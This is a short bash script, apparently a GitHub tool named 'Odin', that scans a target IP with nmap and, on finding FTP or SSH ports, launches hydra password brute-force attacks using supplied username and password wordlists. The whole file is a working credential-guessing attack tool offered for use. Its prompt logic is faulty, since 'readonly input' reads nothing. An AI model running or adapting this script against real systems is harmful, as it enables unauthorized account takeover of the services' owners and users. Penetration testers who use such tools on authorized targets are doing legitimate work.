#!/bin/bash

# -@-Author : UnknowUser50
#
# -@-Date : January 2021
#
# -@-Version : 1.0
#
# -@-Licence : GPL 3.0

export BLUE='\033[1;94m'
export GREEN='\033[1;92m'
export YELLOW='\033[1;93m'
export RED='\033[1;91m'
export RESET='\033[1;00m'

function check() {

(( ${EUID} > "0" )) && echo -e "${RED}[${YELLOW}!${RED}] You must have S.U rights to run Odin ${RESET}" && exit 1

if [ ! -e /usr/bin/hydra ] && [ ! -e /usr/bin/nmap ]; then
  sudo apt install -y hydra ; sudo apt install -y nmap &>/dev/null
fi

ping -c 1 www.google.com &>/dev/null
if [ "$?" -gt "0" ]; then
  echo -e "${YELLOW}[${RED}!${YELLOW}] $basename$0 : Network error, please check your connection ${RESET}"; exit 1
fi

}

function banner() {

echo -e "${YELLOW}  ,  /\  .       "
echo -e "${YELLOW} //'-||-'\\      "
echo -e "${YELLOW}(| -=||=- |)     "
echo -e "${YELLOW} \\,-||-.//      "
echo -e "${YELLOW}  '  ||  '       "
echo -e "${YELLOW}     ||          "
echo -e "${YELLOW}     ||          "
echo -e "${YELLOW}     ||          "
echo -e "${YELLOW}     ||          "
echo -e "${YELLOW}     ||          "
echo -e "${YELLOW}     ()          "
echo ""
echo -e "${RED} .:.:. UnknowUser50 .:.:. ${RED}"

}

function main() {

# Number of arguments : 3 or exit
if (( $# != 3 ))
then
  echo -e "${RED}[${YELLOW}+${RED}] $basename$0 : Argument error ! ${RESET}" ; help ; exit 1
fi

target=$1
wordlist_user=$2
wordlist_pass=$3

# check arg 1 : ip format 
if [ ${#target} -gt 15 ] || [ ${#target} -lt 7 ]; then
  echo -e "${RED}[${YELLOW}!${RED}] The format of the IP does not correspond to the standard ! ${RESET}" ; help ; exit 1
fi  

# check service(s) on the target :
sudo nmap -sV ${target} > output.txt ; sudo chown ${UID} output.txt ; sudo chmod 755 output.txt

# ftp :
if grep -q 21/tcp output.txt; then
  echo -e "${YELLOW}[${RED}!${YELLOW}] FTP service on the target ${RESET}"
  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; readonly input
  if [ ${input} = 'Y' ] || [ ${input} = 'y' ]; then
    hydra -L ${wordlist_user} -P ${wordlist_pass} ${target} ftp > br_ftp.txt
    echo -e "${YELLOW}[${RED}!${YELLOW}] Bruteforce OK - output : br_ftp.txt ${RESET}"
  fi
fi

# ssh :
if grep -q 22/tcp output.txt; then
  echo -e "${YELLOW}[${RED}!${YELLOW}] SSH service on the target ${RESET}"
  echo -e -n "${YELLOW}[${RED}!${YELLOW}] Bruteforce ? ([Y]es/[n]o) : ${RESET}" ; readonly input
  if [ ${input} = 'Y' ] || [ ${input} = 'y' ]; then
    hydra -L ${wordlist_user} -P ${wordlist_pass} ${target} ssh > br_ssh.txt
    echo -e "${YELLOW}[${RED}!${YELLOW}] Bruteforce OK - output : br_ssh.txt ${RESET}"
  fi
fi 

}

function help() {

cat << "EOF" 

        Usage : sudo ./Zsasz.sh <target:1.1.1.1> <wordlist_user:/usr/share/wordlists/....> <wordlist_pass:/.../>
        
        @ arg 1 : the ip of the target - example : <1.1.1.1>
        
        @ arg 2 : the path of the username wordlist - example : </usr/share/wordlists/user.txt>
        
        @ arg 3 : the path of the password wordlist - example : </usr/share/wordlists/pass.txt>
        
        Services available for the moment : 
        1) ssh
        2) ftp
        
        For any problem : <UnknowUser50@protonmail.com> or open issue on <https://www.github.com/UnknowUser50/Odin>
        
        Thank you
        
EOF

}

function author() {

cat << "EOF" 

        Develop by : UnknowUser50
        
        Date : January 2021
        
        Github : https://www.github.com/UnknowUser50/
        
EOF

}

if [ "$1" == "--help" ] || [ "$1" == "-h" ] ||[ "$1" == "help" ]; then
  clear ; help
fi

# call function 'check' and 'main' with arguments
check $@
banner
main $@
